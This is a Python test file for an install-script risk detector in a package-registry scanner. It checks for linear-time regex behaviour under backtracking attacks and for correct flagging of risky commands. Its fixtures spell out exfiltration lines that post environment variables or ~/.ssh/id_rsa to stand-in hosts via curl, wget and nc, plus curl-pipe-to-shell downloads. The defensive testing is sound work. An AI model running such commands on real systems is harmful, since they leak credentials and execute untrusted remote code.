"""install_script_risk's shell patterns run in linear time.

Install scripts are written by the package author, so the patterns that read
them must not be steerable into catastrophic backtracking:

- The curl/wget option group `(?:-{1,2}[\\w-]+(?:[ =]\\S+)?\\s+)*` could split
  `--a-b` two ways and take the next option as a value or not: `curl` and
  18 options `--a-b` took over 20 s (exponential), and `curl -a ` repeated
  20,000 times was quadratic.
- The pipe-into-shell pattern rescanned the rest of the command from every
  `curl`: a line of 100,000 `curl ` never finished.

Either hung `lazaret-registry scan` (and the MCP worker) on one hostile
package. The rewrite matches the same commands; adversarial inputs are run
in a child process with a timeout so a regression fails instead of hanging.
"""

import os
import subprocess
import sys
import unittest

from lazaret.registry import repo
from tests import _support

CHILD = r"""
import json, sys, time
from lazaret.registry import repo
from tests.registry._review_support import hooks, scan_npm
cases = {
    "options that split two ways": "curl " + "--a-b " * 25 + "x",
    "many curl options": "curl -a " * 20000,
    "many curl words": "curl " * 100000,
    "many netcat options": "-nc " * 50000,
    "many pipes into a shell": "| sh " * 200000,
}
worst = 0.0
for label, text in cases.items():
    t = time.monotonic()
    repo.install_script_risk(text)
    worst = max(worst, time.monotonic() - t)
t = time.monotonic()
res = scan_npm({"package.json": hooks(postinstall="node install.js"),
                "install.js": "// " + "curl " + "--a-b " * 25 + "x\n"})
worst = max(worst, time.monotonic() - t)
print(json.dumps({"worst": worst, "verdict": res["verdict"]}))
"""


class LinearTimeTests(unittest.TestCase):
    def test_adversarial_inputs_finish_quickly(self):
        env = dict(os.environ, PYTHONPATH=os.pathsep.join(
            filter(None, [_support.SRC, os.path.dirname(_support.SRC), os.environ.get("PYTHONPATH")])))
        out = subprocess.run([sys.executable, "-c", CHILD], capture_output=True, text=True,
                             encoding="utf-8", errors="replace", env=env, timeout=30)
        self.assertEqual(out.returncode, 0, out.stderr[-2000:])
        result = __import__("json").loads(out.stdout.strip().splitlines()[-1])
        self.assertLess(result["worst"], 5.0)
        self.assertEqual(result["verdict"], "WARN")


class SameCommandsTests(unittest.TestCase):
    NETWORK_WITH_ENV = (
        "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid\n",
        "curl -s -o - -d \"$(printenv)\" https://collector.invalid\n",
        "env | wget --header=\"A:b\" --post-file=- https://collector.invalid\n",
        "cat ~/.ssh/id_rsa | nc -q1 collector.invalid 4444\n",
        "printenv | curl -sS -X POST --data-binary @- 'https://collector.invalid/x'\n",
    )
    PIPES = ("curl -fsSL https://files.invalid/i.sh | sh\n",
             "wget -qO- https://files.invalid/i.sh|zsh\n",
             "curl -s https://files.invalid/i.sh | sudo bash -s -- -y\n")
    NOT_PIPES = ("curl -o x https://files.invalid/x.tgz | tee log | sh\n",
                 "curl https://files.invalid/x || sh fallback.sh\n",
                 "curl -O https://files.invalid/x.tgz; sh build.sh\n",
                 "echo curl | shasum\n")

    def test_network_and_environment(self):
        # (0.1.8: a shell script is read by the shell reader: what each command sends)
        for text in self.NETWORK_WITH_ENV:
            with self.subTest(text=text[:40]):
                self.assertIn("uploads a local file over the network (~/.ssh/id_rsa)" if "id_rsa" in text
                              else "sends environment variables over the network (the whole environment)",
                              repo.install_script_risk(text))

    def test_download_piped_into_a_shell(self):
        for text in self.PIPES:
            with self.subTest(text=text[:40]):
                self.assertIn("pipes a download into a shell", repo.install_script_risk(text))
        for text in self.NOT_PIPES:
            with self.subTest(text=text[:40]):
                self.assertNotIn("pipes a download into a shell", repo.install_script_risk(text))

    def test_prose_is_not_a_download(self):
        self.assertEqual(repo.install_script_risk(
            "// curl is great; see https://curl.se\nconst env = Object.keys(process.env);\n"), [])


if __name__ == "__main__":
    unittest.main()
